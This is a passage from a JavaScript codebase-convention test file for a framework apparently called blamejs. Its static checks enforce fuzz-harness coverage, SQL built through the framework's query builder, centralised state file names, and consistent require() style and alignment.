    "lib/guard-domain.js":   "single-value validator; covered by safe-url IDN-homograph fuzzing surface",
    "lib/guard-filename.js": "single-string validator; deterministic codepoint scan, no adversarial-bytes parser",
    "lib/guard-graphql.js":  "operator-supplied variables-shape validator; no raw-bytes parser",
    "lib/guard-image.js":    "operator-feeds-metadata pattern; magic-byte detection covered by safe-buffer",
    "lib/guard-jwt.js":      "JWT parse path covered upstream by b.auth.jwt + safe-json fuzz",
    "lib/guard-jsonpath.js": "JSONPath validator covered by safe-jsonpath fuzz",
    "lib/guard-mime.js":     "single-string validator over a finite vocabulary; no adversarial-bytes parser",
    "lib/guard-oauth.js":    "operator-supplied params validator; flow-shape rather than bytes-parser",
    "lib/guard-pdf.js":      "operator-feeds-metadata pattern; magic-byte detection covered by safe-buffer",
    "lib/guard-regex.js":    "regex-source linter; deterministic AST walk, no parser surface",
    "lib/guard-shell.js":    "argv-shape validator over operator-supplied tokens; not a bytes-parser",
    "lib/guard-template.js": "template-source linter (operator-authored); not adversarial-input surface",
    "lib/guard-time.js":     "single-value validator over a finite vocabulary; no adversarial-bytes parser",
    "lib/guard-uuid.js":     "single-string validator; deterministic regex match, no parser surface",
    "lib/guard-auth.js":     "auth-bundle composite validator; member fields covered by their own guards",
    "lib/guard-html-wcag.js":         "internal helper consumed only by guard-html.js (WCAG check); covered transitively by guard-html fuzz",
    "lib/guard-html-wcag-aria.js":    "internal helper consumed only by guard-html.js; covered transitively by guard-html fuzz",
    "lib/guard-html-wcag-forms.js":   "internal helper consumed only by guard-html.js; covered transitively by guard-html fuzz",
    "lib/guard-html-wcag-tables.js":  "internal helper consumed only by guard-html.js; covered transitively by guard-html fuzz",
    "lib/guard-html-wcag-tagwalk.js": "internal helper consumed only by guard-html.js; covered transitively by guard-html fuzz",
    "lib/parsers/safe-env.js":        ".env file loader takes a filepath (not adversarial in-process bytes); operator controls the file boundary, schema-validation gates the values",
    "lib/safe-path.js":               "operator-supplied path-segment validator over the existing guardFilename codepoint tables (reserved-name + bidi + overlong-UTF-8 inherited transitively); the per-segment regex set is deterministic + anchored + length-bounded by the caller-supplied rel, no adversarial-bytes parser surface",
  };
  var fs   = require("node:fs");
  var path = require("node:path");
  var repoRoot = path.resolve(__dirname, "..", "..");
  var libDir   = path.join(repoRoot, "lib");
  var fuzzDir  = path.join(repoRoot, "fuzz");
  var libFiles = [];
  function _walk(dir) {
    fs.readdirSync(dir, { withFileTypes: true }).forEach(function (e) {
      var full = path.join(dir, e.name);
      if (e.isDirectory()) {
        if (e.name === "vendor" || e.name === "node_modules") return;
        _walk(full);
        return;
      }
      if (!e.isFile() || !/\.js$/.test(e.name)) return;
      if (!/^(safe|guard)-/.test(e.name)) return;
      libFiles.push(path.relative(repoRoot, full).replace(/\\/g, "/"));
    });
  }
  _walk(libDir);
  var hits = [];
  libFiles.forEach(function (rel) {
    if (FUZZ_NOT_REQUIRED[rel]) return;
    // Fuzz harness path mirrors the lib path under fuzz/, flattened
    // with `__` substituted for nested `/` so each harness file
    // remains a sibling under fuzz/. Either form (flat
    // `fuzz/safe-toml.fuzz.js` for top-level OR nested
    // `fuzz/parsers__safe-toml.fuzz.js`) satisfies the gate.
    var base = rel.replace(/^lib\//, "").replace(/\.js$/, "");
    var flatBase   = path.basename(base);                       // safe-toml
    var nestedBase = base.replace(/\//g, "__");                  // parsers__safe-toml
    var flatPath   = path.join(fuzzDir, flatBase + ".fuzz.js");
    var nestedPath = path.join(fuzzDir, nestedBase + ".fuzz.js");
    var harnessPath = fs.existsSync(flatPath) ? flatPath
                    : fs.existsSync(nestedPath) ? nestedPath
                    : null;
    if (!harnessPath) {
      hits.push({
        file: rel, line: 1,
        content: "missing fuzz harness — expected fuzz/" + nestedBase + ".fuzz.js (or fuzz/" + flatBase + ".fuzz.js for top-level primitives) OR an explicit FUZZ_NOT_REQUIRED entry with reason",
      });
      return;
    }
    // ClusterFuzzLite / OSS-Fuzz format check: every harness must
    // export `fuzz` (jazzer.js libFuzzer entry-point). Catches the
    // drift where someone adds a `fuzz/<x>.fuzz.js` that doesn't
    // wire into the coverage-guided engine.
    var content;
    try { content = fs.readFileSync(harnessPath, "utf8"); }
    catch (_e) { content = ""; }
    if (!/module\.exports\.fuzz\s*=/.test(content)) {
      hits.push({
        file: path.relative(repoRoot, harnessPath).replace(/\\/g, "/"), line: 1,
        content: "fuzz harness missing `module.exports.fuzz = function (data) { ... }` — required by jazzer.js / ClusterFuzzLite / OSS-Fuzz",
      });
    }
    // Seed corpus is recommended (libFuzzer bootstraps from seeds);
    // missing-corpus is a warning, not a hard fail — primitives with
    // very wide input vocabulary (e.g. arbitrary HTML) can rely on
    // mutator-only exploration. We DON'T report on it here; the
    // build script just skips the zip step when the dir is missing.
  });
  _report("every lib/safe-*.js / lib/guard-*.js parser-or-validator has a fuzz/<name>.fuzz.js (or is allowlisted in FUZZ_NOT_REQUIRED)",
    hits);
}

// ---- Pattern 9: Tier-A/B/C terminology in shipped lib/ ----

function testNoTierTerminologyInLib() {
  // feedback_no_tier_terminology.md — internal validation-policy labels
  // shouldn't appear in lib/ comments or strings; describe the behavior
  // in plain terms instead.
  var matches = _scan(/\bTier[- ]?(A|B|C|1|2|3)\b/i, { skipComments: false });
  matches = _filterMarkers(matches, "tier-terminology");
  _report("no Tier-A / Tier-B / Tier-C terminology in lib/", matches);
}

// ---- No hand-rolled SQL — compose b.sql / b.guardSql ----
//
// String-built SQL is the surface that breaks on Postgres (unquoted
// identifiers fold to lowercase) and that the b.sql builder eliminates
// by construction: it quotes every identifier through b.safeSql, binds
// every value as a placeholder, resolves table names + the configurable
// prefix, and routes raw fragments through b.guardSql. So no lib/ module
// should compose SQL by hand — it should build it through b.sql, and it
// should never hardcode a `_blamejs_*` table literal (that bypasses the
// configurable-prefix resolution). This detector flags both: a string
// literal that STARTS a SQL statement, and a hardcoded `_blamejs_*`
// literal, in any DB-touching lib file outside the migration backlog.
//
// Files still carrying hand-rolled SQL live on HAND_ROLLED_SQL_BACKLOG
// until migrated onto b.sql; remove a file from the backlog as it is
// migrated, and any residual hand-rolled SQL in it then fails the gate
// (so the migration runs to completion and can't silently stall). A new
// DB file that hand-rolls SQL without being on the backlog fails
// immediately. Only DB-touching files (a SQL execution sink or a
// `_blamejs_` literal) are scanned, so non-SQL `SELECT`/`WITH` text in
// guard-html / forms / i18n etc. never false-positives.
//
// PERMANENT exceptions: the builder/guard/primitive that legitimately
// produce or inspect SQL text.
var HAND_ROLLED_SQL_PERMANENT = {
  "lib/sql.js":             1,   // the b.sql builder itself
  "lib/guard-sql.js":       1,   // the b.guardSql guard inspects SQL text
  "lib/safe-sql.js":        1,   // identifier primitive (docstring examples)
  "lib/framework-schema.js": 1,  // declarative DDL + the canonical LOCAL_TO_EXTERNAL name source
};
// Migration backlog — every DB file still hand-rolling SQL. Shrinks to
// empty as the everything-sweep migrates each onto b.sql.
//
// db-declare-row-policy / outbox / inbox now compose b.sql: the builder
// grew the constructs they needed — Postgres RLS (enableRowLevelSecurity /
// createPolicy / dropPolicy), `FOR UPDATE SKIP LOCKED` (forUpdate), the
// single-bind `col = ANY(?)` array form (whereInArray), an allowlisted
// value-position SQL function (fn -> NOW() / CURRENT_TIMESTAMP) and cast
// (cast -> `?::jsonb` / `?::interval`), `ON CONFLICT DO NOTHING RETURNING`
// (doNothing().returning()), the sqlite `SELECT changes()` probe
// (catalog.changes), a partial index (createIndex { where }), and the
// driver-final `$1..$N` translation for code that hands SQL to an
// operator-supplied driver directly (toExternalSql).
//
// vault/rotate now composes b.sql end to end: the at-rest key-rotation
// pipeline walks its standalone node:sqlite handle through the catalog /
// pragma sub-API (`sqlite_master` list / `tableExists` / `PRAGMA
// table_info` / `journal_mode` / `synchronous` / `wal_checkpoint` /
// `ORDER BY RANDOM()`), and the per-column re-seal SELECT/UPDATE + drift
// sample + verification COUNT through b.sql.select / b.sql.update.
//
// mail-store now composes b.sql end to end: the sqlite-only sealed full-
// text mail store builds every cached prepared statement + the schema
// bootstrap through b.sql with { dialect: "sqlite", quoteName: true } (the
// store targets a concrete sqlite handle, never clusterStorage, so each
// prefixed table name emits as a quoted identifier). The FTS5 search runs
// through whereMatch (the `<fts> MATCH ?` IN-subquery), the hard-expunge
// candidate set through whereInJsonEach (json_each), and the FTS5 virtual-
// table DDL through createVirtualTable; the composite-PK flags table, the
// ON-DELETE-CASCADE FK back to messages, and the per-folder quota
// accumulator (`col = col + EXCLUDED.col`) compose createTable /
// upsert.doUpdate. The backlog is now empty.
var HAND_ROLLED_SQL_BACKLOG = {
};
function testNoHandRolledSql() {
  // A DB-touching file: composes a SQL execution sink or hardcodes a
  // framework table name. Only these are scanned (no non-SQL FPs).
  var SINK = /clusterStorage\.(?:execute|executeOne|executeAll)|externalDb\.query|\bdb\(\)\.(?:prepare|exec|run)|\b_q\(|\b_psql\(|tx\.query|runSqlOnHandle/;
  // A hardcoded framework TABLE-name literal - `_blamejs_<words>` whose
  // token does NOT continue into a `.` (which would make it a file name
  // like `_blamejs_rotate.tmp.db`, not a table reference). The trailing
  // `(?![a-z_.])` asserts the whole token ended (no further word char) and
  // is not immediately followed by `.`, keeping the rule on hardcoded table
  // names and off staging-file path literals.
  var LIT  = /_blamejs_[a-z_]+(?![a-z_.])/;
  // A string literal that STARTS a SQL statement.
  // TRUNCATE requires a following TABLE keyword or a table-name token - a
  // bare quoted "TRUNCATE" (e.g. a PRAGMA wal_checkpoint mode arg, or an
  // FTS5 token) is not the TRUNCATE statement and must not false-positive.
  var START = /(["'`])\s*(SELECT\b|INSERT\s+(?:INTO|OR)\b|REPLACE\s+INTO\b|UPDATE\s+["'`]?[A-Za-z_]|DELETE\s+FROM\b|CREATE\s+(?:TABLE|UNIQUE\s+INDEX|INDEX|TRIGGER|VIRTUAL\s+TABLE|OR\s+REPLACE)\b|ALTER\s+TABLE\b|DROP\s+(?:TABLE|TRIGGER|INDEX)\b|WITH\s+[A-Za-z_]|MERGE\s+INTO\b|TRUNCATE\s+(?:TABLE\s+)?["'`]?[A-Za-z_])/i;
  // A SQL CLAUSE fragment assembled by string concatenation (mid-statement
  // construction a START-only check misses): `... + " WHERE " + ...`,
  // `" SET " +`, `" VALUES (" +`, `" FROM " +`, `" ORDER BY " +`, the JOIN
  // family, ON CONFLICT / RETURNING / LIMIT / OFFSET / HAVING / GROUP BY.
  // The leading/trailing `+` (or the unclosed `(` for VALUES) is the
  // build-by-concat tell that separates it from a fragment passed whole to
  // b.sql's whereRaw / setRaw (which carry their own allow marker).
  var FRAG = /(?:\+\s*(["'`])\s*(?:SET|FROM|WHERE|VALUES|ORDER\s+BY|GROUP\s+BY|HAVING|RETURNING|LIMIT|OFFSET|ON\s+CONFLICT|(?:INNER\s+|LEFT\s+|RIGHT\s+|CROSS\s+)?JOIN)\b|(["'`])\s*(?:SET|FROM|WHERE|VALUES\s*\(|ORDER\s+BY|GROUP\s+BY|HAVING|RETURNING|ON\s+CONFLICT|(?:INNER\s+|LEFT\s+|RIGHT\s+|CROSS\s+)?JOIN)\b[^"'`]*\2\s*\+)/i;
  var matches = [];
  var files = _libFiles();
  for (var i = 0; i < files.length; i++) {
    var rel = _relPath(files[i]);
    if (HAND_ROLLED_SQL_PERMANENT[rel] || HAND_ROLLED_SQL_BACKLOG[rel]) continue;
    var content;
    try { content = fs.readFileSync(files[i], "utf8"); }
    catch (_e) { continue; }
    if (!SINK.test(content) && !LIT.test(content)) continue;   // not a DB file
    var lines = content.split(/\r?\n/);
    for (var j = 0; j < lines.length; j++) {
      var line = lines[j];
      if (/^\s*(\/\/|\*|\/\*)/.test(line)) continue;   // comment line
      if (START.test(line)) {
        matches.push({ file: rel, line: j + 1, content: "hand-rolled SQL — use b.sql: " + line.trim().slice(0, 90) });
        continue;
      }
      if (FRAG.test(line)) {
        matches.push({ file: rel, line: j + 1, content: "hand-rolled SQL clause built by concatenation — use b.sql: " + line.trim().slice(0, 80) });
        continue;
      }
      if (/_blamejs_[a-z_]+(?!\.)/.test(line)) {
        matches.push({ file: rel, line: j + 1, content: "hardcoded _blamejs_* literal — use frameworkSchema.tableName / b.sql: " + line.trim().slice(0, 70) });
      }
    }
  }
  matches = _filterMarkers(matches, "hand-rolled-sql");
  _report("no hand-rolled SQL outside the b.sql builder (compose b.sql / b.guardSql; no hardcoded _blamejs_* literals)", matches);
}

// ---- Pattern 9b: no hardcoded framework state file names ----
//
// The framework's on-disk state file names (db.enc, db.key.enc, vault.key,
// audit.tip, ...) are centralized in lib/framework-files.js so a rename /
// relocation is one edit and operators can override them. Every owner should
// resolve its file name via frameworkFiles.fileName(<logical>) instead of
// hardcoding the literal. This is the inverse detector that drives that
// migration in reverse (mirrors testNoHandRolledSql for table names): files
// still hardcoding a registered name live on FRAMEWORK_FILE_NAME_BACKLOG
// until migrated; remove a file as it migrates and any residual literal then
// fails the gate. A NEW lib file hardcoding a registered state-file name
// without being on the backlog fails immediately.
var FRAMEWORK_FILE_PERMANENT = {
  "lib/framework-files.js": 1,   // the registry that DEFINES the canonical names
};
var FRAMEWORK_FILE_NAME_BACKLOG = {
};
// Registered state-file names — kept in sync with framework-files.js
// DEFAULT_FILE_NAMES. A quoted literal of any of these outside the registry
// or the backlog is a hardcoded name that should resolve via frameworkFiles.
var FRAMEWORK_STATE_FILE_NAMES = [
  "db.enc", "db.key.enc", "vault.key", "audit.tip", "audit-sign.key",
  "rows.enc", "checkpoint.enc",
];
function testNoHardcodedFrameworkFileNames() {
  var rx = new RegExp("[\"'`](" + FRAMEWORK_STATE_FILE_NAMES.map(function (n) {
    // Escape every regex metacharacter (not just "."), backslash first so a
    // name containing one can't smuggle an escape into the alternation.
    return n.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
  }).join("|") + ")[\"'`]");
  var matches = [];
  var files = _libFiles();
  for (var i = 0; i < files.length; i++) {
    var rel = _relPath(files[i]);
    if (FRAMEWORK_FILE_PERMANENT[rel] || FRAMEWORK_FILE_NAME_BACKLOG[rel]) continue;
    var content;
    try { content = fs.readFileSync(files[i], "utf8"); }
    catch (_e) { continue; }
    if (!rx.test(content)) continue;
    var lines = content.split(/\r?\n/);
    for (var j = 0; j < lines.length; j++) {
      var line = lines[j];
      if (/^\s*(\/\/|\*|\/\*)/.test(line)) continue;   // comment line
      var m = line.match(rx);
      if (m) {
        matches.push({ file: rel, line: j + 1,
          content: "hardcoded framework state file name " + m[0] +
            " - resolve via frameworkFiles.fileName(<logical>): " + line.trim().slice(0, 60) });
      }
    }
  }
  matches = _filterMarkers(matches, "hardcoded-framework-file-name");
  _report("no hardcoded framework state file names outside lib/framework-files.js " +
    "(resolve via frameworkFiles.fileName)", matches);
}

// ---- Pattern 10: inline require() (should be top-of-file) ----

function testNoInlineRequires() {
  // feedback_top_of_file_requires.md — inline require() inside function
  // bodies is a smell. Operators reading the lib expect all deps at
  // file top; circular-load cases need an explicit comment.
  // Match `require("./...")` indented (not at column 0).
  var matches = _scan(/^\s+\S.*\brequire\(["']\.\.?\//);
  matches = _filterMarkers(matches, "inline-require");
  _report("require() at top of file (or inline-require allow marker)",
    matches);
}

// ---- Pattern 10a: require() with a non-literal argument ----

// CANONICAL_REQUIRE_BINDINGS — for each module imported via plain
// `var X = require("M")` shape, the framework's chosen name for X.
// Convention: Node built-ins use a `node<X>` prefix so a local var
// named `fs` / `path` / `crypto` can never shadow them; framework's
// own `lib/crypto.js` is bound as `bCrypto` so it doesn't shadow
// node:crypto either. Modules not listed fall back to majority-wins
// (most-sites name wins; alphabetical tiebreak).
//
// When adding a new module, prefer adding it here over relying on
// majority-wins so future authors copy the canonical name.
var CANONICAL_REQUIRE_BINDINGS = {
  // Node built-ins — node-prefix avoids shadowing common local names.
  "fs":           "nodeFs",
  "node:fs":      "nodeFs",
  "path":         "nodePath",
  "node:path":    "nodePath",
  "crypto":       "nodeCrypto",
  "node:crypto":  "nodeCrypto",
  "stream":       "nodeStream",
  "node:stream":  "nodeStream",
  "tls":          "nodeTls",
  "node:tls":     "nodeTls",
  "url":          "nodeUrl",
  "node:url":     "nodeUrl",
  // Framework's own crypto module — `bCrypto` matches the `b.crypto`
  // public namespace and doesn't shadow node:crypto.
  "./crypto":     "bCrypto",
  "../crypto":    "bCrypto",
};

// Node built-ins that the framework requires anywhere — used by the
// node-builtin-prefix detector to refuse `require("X")` in favor of
// `require("node:X")` (modern Node 18+ convention; protects against
// userland packages shadowing built-in names).
var NODE_BUILTINS = {
  "assert": 1, "async_hooks": 1, "buffer": 1, "child_process": 1,
  "cluster": 1, "console": 1, "constants": 1, "crypto": 1, "dgram": 1,
  "dns": 1, "domain": 1, "events": 1, "fs": 1, "http": 1, "http2": 1,
  "https": 1, "inspector": 1, "module": 1, "net": 1, "os": 1, "path": 1,
  "perf_hooks": 1, "process": 1, "punycode": 1, "querystring": 1,
  "readline": 1, "repl": 1, "stream": 1, "string_decoder": 1, "sys": 1,
  "timers": 1, "tls": 1, "trace_events": 1, "tty": 1, "url": 1,
  "util": 1, "v8": 1, "vm": 1, "wasi": 1, "worker_threads": 1, "zlib": 1,
};

function testNodeBuiltinPrefixConsistency() {
  // class: node-builtin-prefix
  // Every `require("<X>")` of a Node built-in module must use the
  // modern `require("node:<X>")` form. Three reasons:
  //   1. Userland packages on npm CAN be named after built-ins
  //      (e.g. some package called "fs"). Without the `node:` prefix
  //      a typo / package-install accident would shadow the built-in.
  //   2. The prefix is a clearer signal at a glance that this is a
  //      framework dependency on Node, not on a userland module.
  //   3. Bundler / SEA static-trace passes treat `node:` prefix as
  //      an unambiguous Node-builtin marker; the unprefixed form
  //      can be resolved against userland first.
  //
  // Fix is to rewrite the require string, NOT to rename the local
  // binding. The CANONICAL_REQUIRE_BINDINGS map already maps both
  // `"fs"` and `"node:fs"` to the same canonical name (`nodeFs`), so
  // the binding stays stable across the rewrite.
  var files = _libFiles();
  var bad = [];
  for (var fi = 0; fi < files.length; fi++) {
    var rel = _relPath(files[fi]);
    var src = fs.readFileSync(files[fi], "utf8");
    var lines = src.split("\n");
    for (var li = 0; li < lines.length; li++) {
      var line = lines[li];
      // Match any `require("X")` where X is a Node built-in name.
      // Skip lines INSIDE a JSDoc `@example` block (* indented form)
      // — those are operator-facing examples where bare `require("fs")`
      // is intentional. Heuristic: skip lines where the require sits
      // inside a ` *   ` (JSDoc continuation) indent.
      if (/^\s*\*\s/.test(line)) continue;
      var re = /\brequire\(["']([a-z_][a-z0-9_]*)["']\)/g;
      var m;
      while ((m = re.exec(line)) !== null) {
        var modName = m[1];
        if (NODE_BUILTINS[modName]) {
          bad.push({
            file:    rel,
            line:    li + 1,
            content: 'require("' + modName + '") — use require("node:' +
                     modName + '") for the modern Node-builtin prefix',
          });
          break;   // one report per line
        }
      }
    }
  }
  bad = _filterMarkers(bad, "node-builtin-prefix");
  _report("require() for Node built-in modules must use the `node:` " +
          "prefix (modern Node 18+ convention; protects against " +
          "userland packages shadowing built-in names)",
    bad);
}

// INTERNAL_BINDING_NAMES — bindings that exist as INTERNAL framework
// variables but should NEVER appear in operator-facing prose / error
// messages / JSDoc comments. Operators reading docs or catching errors
// see the public API name (`b.crypto`, `b.retry`, `path`, `fs`), never
// the internal binding (`bCrypto`, `retryHelper`, `nodePath`, `nodeFs`).
//
// Surfaced by the v0.9.15 → v0.9.16 audit: the mechanical rename of
// `<OLD>.` → `<NEW>.` also caught occurrences inside JSDoc `@opts`
// comments and error-message string literals (e.g. operator's
// "fallbackFile must be an absolute path" became "absolute nodePath").
// This detector enforces the rule going forward.
var INTERNAL_BINDING_NAMES = [
  "nodeFs", "nodePath", "nodeCrypto", "nodeStream", "nodeTls", "nodeUrl",
  "bCrypto", "retryHelper",
];

function testNoInternalBindingNameInProse() {
  // class: internal-binding-in-prose
  // Internal binding names must not appear in:
  //   - JSDoc/comment lines (` * `-prefixed continuation lines)
  //   - String literals visible to operators (error messages, audit
  //     metadata, log messages)
  //
  // CODE positions are EXCLUDED — `var nodeFs = require(...)`,
  // `nodeFs.readFileSync(...)`, `if (nodeTls && nodeTls.X)`,
  // `void nodeCrypto;` etc. are legit framework-internal usages.
  // The detector specifically checks the prose surface — anything
  // an operator reading docs / catching errors actually sees.
  var files = _libFiles();
  var bad = [];
  var bindingAlt = INTERNAL_BINDING_NAMES.join("|");
  // Two contexts to scan:
  //   1. JSDoc/comment continuation lines (` * `-prefixed).
  //   2. String literals on any line.
  var jsdocLineRe = /^\s*\*\s/;
  var bareWordRe = new RegExp("\\b(" + bindingAlt + ")\\b", "g");
  // String-literal matcher: find double-quoted or single-quoted spans.
  // Lazy match avoids spanning multiple string boundaries on one line.
  var stringSpanRe = /"(?:\\.|[^"\\])*"|'(?:\\.|[^'\\])*'/g;
  for (var fi = 0; fi < files.length; fi++) {
    var rel = _relPath(files[fi]);
    var src = fs.readFileSync(files[fi], "utf8");
    var lines = src.split("\n");
    for (var li = 0; li < lines.length; li++) {
      var line = lines[li];
      var hit = null;
      if (jsdocLineRe.test(line)) {
        // JSDoc/comment continuation — flag any binding-name word.
        bareWordRe.lastIndex = 0;
        var mJs = bareWordRe.exec(line);
        if (mJs) hit = mJs[1];
      } else {
        // Code line — only flag binding-name words INSIDE string
        // literals (operator-visible error messages etc.).
        stringSpanRe.lastIndex = 0;
        var mStr;
        while ((mStr = stringSpanRe.exec(line)) !== null) {
          bareWordRe.lastIndex = 0;
          var mInStr = bareWordRe.exec(mStr[0]);
          if (mInStr) { hit = mInStr[1]; break; }
        }
      }
      if (hit) {
        bad.push({
          file:    rel,
          line:    li + 1,
          content: "internal binding name `" + hit +
                   "` appears in operator-facing prose — use the " +
                   "public API name (path / fs / crypto / retry / ...) " +
                   "or, for legit binding documentation, hide behind " +
                   "an `// allow:internal-binding-in-prose` marker",
        });
      }
    }
  }
  bad = _filterMarkers(bad, "internal-binding-in-prose");
  _report("internal binding names (`nodeFs` / `nodePath` / `bCrypto` / " +
          "`retryHelper` / ...) must not appear in operator-facing " +
          "prose — JSDoc comments, error messages, audit metadata",
    bad);
}

// ---- Pattern: require-block `=` column alignment ----
//
// class: require-block-misaligned
//
// Within a contiguous top-of-file run of `var <name> = require(...)` /
// `var { ... } = require(...)` lines, the `=` signs share a column WHEN
// the block is written in the aligned style. Two styles ship in lib/
// and BOTH are legitimate:
//
//   compact (single space — never flagged):
//     var C = require("./constants");
//     var audit = require("./audit");
//
//   aligned (padded to a shared column):
//     var lazyRequire = require("./lazy-require");
//     var C           = require("./constants");
//
// The detector fires only on a sub-block that DECLARES alignment intent
// (at least one require line carries 2+ spaces before its `=`) and only
// on a line that COULD reach the block's shared column but doesn't.
//
// The shared column is the MODAL `=` column — the column the majority
// of the block's require lines actually use. A line is a violation when
// its `=` is off the modal column AND its left-hand side is short enough
// to reach it: `lhsLen + 1 <= modalCol`. A `var { LongDestructure } =`
// or a long plain name whose LHS is as wide as (or wider than) the modal
// column can only ever get a single space — it physically can't align,
// so that overshoot is house style, not drift, and is EXEMPT. (This is
// the classic `var guardAgentRegistry = ...` / `var { defineClass } = ...`
// shape: unfittable, correctly ignored. The target is the fittable line
// that drifts one column anyway — the stray extra space, or the short
// `var C =` that didn't get padded to the column.)
//
// Sub-blocks align INDEPENDENTLY. A blank line OR an interior `//` /
// `/* */` comment divider between require lines splits the run: a tier
// of node: builtins or a lazyRequire tier separated from the relative-
// require tier by an explanatory comment is its own group, checked on
// its own column. Only the leading top-of-file require region is
// inspected — array/object element order, later constant blocks, and
// every non-require `=` are out of scope.
//
// REQUIRE_ALIGN_ALLOWLIST below is the migration backlog: files that
// align today but carry a fittable drifted line. As each is reflowed to
// a uniform column (or to compact single-space), drop its entry.
var REQUIRE_ALIGN_ALLOWLIST = [
  "lib/ai-pref.js",
  "lib/archive.js",
  "lib/auth/oid4vci.js",
  "lib/cdn-cache-control.js",
  "lib/compliance-ai-act-logging.js",
  "lib/compliance-ai-act.js",
  "lib/db-file-lifecycle.js",
  "lib/flag-providers.js",
  "lib/http-client-cookie-jar.js",
  "lib/http-client.js",
  "lib/local-db-thin.js",
  "lib/log-stream-syslog.js",
  "lib/mail-require-tls.js",
  "lib/mail-scan.js",
  "lib/mail-server-imap.js",
  "lib/mail-server-mx.js",
  "lib/mail-server-submission.js",
  "lib/mail-srs.js",
  "lib/metrics.js",
  "lib/middleware/body-parser.js",
  "lib/middleware/tus-upload.js",
  "lib/pqc-agent.js",
  "lib/public-suffix.js",
  "lib/queue.js",
  "lib/router.js",
  "lib/scheduler.js",
  "lib/session-device-binding.js",
  "lib/test-harness.js",
  "lib/websocket.js",
];

// A top-of-file require-assignment line. Plain identifier OR a `{ ... }`
// destructure on the left; require / lazyRequire on the right.
var _REQUIRE_ALIGN_LINE = /^\s*var\s+(?:\{[^}]*\}|[A-Za-z_$][\w$]*)\s*=\s*(?:require|lazyRequire)\s*\(/;

// For a require-assignment line: lhsLen (length of the LHS up to and
// including its last non-space token char), col (the `=` column = lhsLen
// + the padding spaces), and pad (the padding-space count). Returns null
// for any line that is not a require-assignment.
function _requireEqInfo(line) {
  var m = line.match(/^(.*?[^\s=!<>+\-*/%&|^])(\s*)=\s*(?:require|lazyRequire)\s*\(/);
  if (!m) return null;
  return { lhsLen: m[1].length, col: m[1].length + m[2].length, pad: m[2].length };
}

// The modal `=` column of a sub-block: the column the most require lines
// land on. Ties break to the wider column (the deliberately-padded one,
// not a short outlier), so a block of two aligned lines plus a stray
// short `var C =` resolves to the aligned column.
function _requireModalColumn(infos) {
  var counts = {};
  var best   = null;
  var bestN  = -1;
  for (var i = 0; i < infos.length; i++) {
    var c = infos[i].info.col;
    counts[c] = (counts[c] || 0) + 1;
    if (counts[c] > bestN || (counts[c] === bestN && c > best)) {
      bestN = counts[c];
      best  = c;
    }
  }
  return best;
}

function testRequireBlockAlignment() {
  // class: require-block-misaligned
  var files = _libFiles();
  var bad = [];

  for (var fi = 0; fi < files.length; fi++) {
    var rel = _relPath(files[fi]);
    if (REQUIRE_ALIGN_ALLOWLIST.indexOf(rel) !== -1) continue;
    var content;
    try { content = fs.readFileSync(files[fi], "utf8"); }
    catch (_e) { continue; }
    var lines = content.split(/\r?\n/);

    // Locate the first leading require line. Skip the shebang,
    // "use strict", and the top docblock / comments + blanks. Bail the
    // moment real code appears before any require (no leading region).
    var firstReq = -1;
    for (var j = 0; j < lines.length; j++) {
      if (_REQUIRE_ALIGN_LINE.test(lines[j])) { firstReq = j; break; }
      var t = lines[j].trim();
      if (t === "") continue;
      if (/^("use strict"|'use strict');?$/.test(t)) continue;
      if (/^#!/.test(t)) continue;
      if (/^\/\//.test(t)) continue;
      if (/^\/\*/.test(t) || /^\*/.test(t) || /\*\//.test(t)) continue;
      break;
    }
    if (firstReq === -1) continue;

    // Collect the contiguous leading require region: require lines,
    // blank lines (sub-block separators), and interior comment lines
    // (also sub-block separators). Stop at the first real-code line
    // that is not a require.
    var region = [];
    var inBlockComment = false;
    for (var k = firstReq; k < lines.length; k++) {
      var line = lines[k];
      var tt = line.trim();
      if (inBlockComment) {
        region.push({ n: k + 1, line: line, kind: "comment" });
        if (/\*\//.test(tt)) inBlockComment = false;
        continue;
      }
      if (_REQUIRE_ALIGN_LINE.test(line)) { region.push({ n: k + 1, line: line, kind: "req" }); continue; }
      if (tt === "") { region.push({ n: k + 1, line: line, kind: "blank" }); continue; }
      if (/^\/\//.test(tt)) { region.push({ n: k + 1, line: line, kind: "comment" }); continue; }
      if (/^\/\*/.test(tt)) {
        region.push({ n: k + 1, line: line, kind: "comment" });
        if (!/\*\//.test(tt)) inBlockComment = true;
        continue;
      }
      break;
    }

    // Split the region into sub-blocks separated by a blank line OR a
    // comment divider; each aligns independently. For every sub-block of
    // >=3 require lines that shows alignment intent (some line padded
    // with 2+ spaces before `=`), flag every line whose `=` is off the
    // modal column yet whose LHS is short enough to reach it.
    var sub = [];
    var flush = function () {
      var infos = [];
      for (var s = 0; s < sub.length; s++) {
        if (sub[s].kind !== "req") continue;
        var info = _requireEqInfo(sub[s].line);
        if (info) infos.push({ entry: sub[s], info: info });
      }
      sub = [];
      if (infos.length < 3) return;
      var anyPadded = infos.some(function (e) { return e.info.pad >= 2; });
      if (!anyPadded) return;                      // compact single-space style — not aligned, not flagged
      var modalCol = _requireModalColumn(infos);
      for (var z = 0; z < infos.length; z++) {
        var e = infos[z];
        if (e.info.col === modalCol) continue;     // already on the column — fine
        if (e.info.lhsLen + 1 > modalCol) continue; // LHS too wide to reach the column — house-style overshoot, exempt
        bad.push({
          file:    rel,
          line:    e.entry.n,
          content: e.entry.line.trim() +
                   "  — `=` off the require-block column (align every `=` in this " +
                   "sub-block to one column, or reflow the group to compact single-space)",
        });
      }
    };
    for (var r = 0; r < region.length; r++) {
      if (region[r].kind === "blank" || region[r].kind === "comment") { flush(); continue; }
      sub.push(region[r]);
    }
    flush();
  }

  _report("top-of-file require blocks keep their `=` signs column-aligned " +
          "(per blank-or-comment-separated sub-block; compact single-space " +
          "blocks and unfittable-LHS lines exempt)",
    bad);
}

function testRequireBindingConsistency() {
  // class: require-binding-name
  // For each module imported via the plain `var <name> = require("<module>")`
  // shape, every file MUST bind it to the same `<name>`. Inconsistent
  // names (`fs` vs `nodeFs`, `crypto` vs `nodeCrypto`, `path` vs
  // `nodePath`) make grep across the lib unreliable and let reviewers
  // miss real shadowing bugs.
  //
  // Canonical names are declared in CANONICAL_REQUIRE_BINDINGS above
  // for safety-critical modules (Node built-ins, framework crypto);
  // other modules fall back to majority-wins (most-sites name wins,
  // alphabetical tiebreak).
  //
  // Scope is intentionally narrow:
  //   - only matches whole-module bindings `var X = require("M")` —
  //     destructuring (`var { Y } = require("M")`) and `.<prop>`
  //     suffixes are skipped;
  //   - `var _foo = require(...)` private bindings (leading underscore)
